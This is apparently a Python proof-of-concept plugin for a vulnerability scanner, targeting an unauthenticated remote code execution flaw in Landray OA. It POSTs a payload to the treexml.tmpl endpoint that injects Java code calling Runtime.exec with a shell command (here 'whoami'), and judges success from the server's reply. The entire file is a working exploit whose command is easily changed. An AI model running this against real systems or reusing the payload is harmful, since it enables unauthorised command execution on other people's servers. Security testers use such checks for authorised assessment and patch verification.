import requests
import urllib, re

def verify(url):
    relsult = {
        'name': '蓝凌OA 未授权RCE(2022HVV)',
        'vulnerable': False,
        'url': url
    }
    cmd = 'whoami'
    timeout = 5
    headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) ",
        'Content-Type': 'application/x-www-form-urlencoded',
    }
    payload = '/data/sys-common/treexml.tmpl'
    vurl = urllib.parse.urljoin(url, payload)
    payload_data = '''s_bean=ruleFormulaValidate&script=try {
String cmd = "%s";
Process child = Runtime.getRuntime().exec(cmd);
} catch (IOException e) {
System.err.println(e);
}''' % cmd
    try:
        finger_rep = requests.post(vurl, headers=headers, timeout=timeout, verify=False)
        if re.search('参数s_bean不能为空', finger_rep.text):
            rep = requests.post(vurl, headers=headers, timeout=timeout, verify=False, data=payload_data)
            if re.search('公式运行时返回了空值，所以无法校验返回值类型', rep.text) and rep.status_code == 200:
                relsult['vulnerable'] = True
                relsult['vurl'] = vurl
        return relsult
    except:
        return relsult
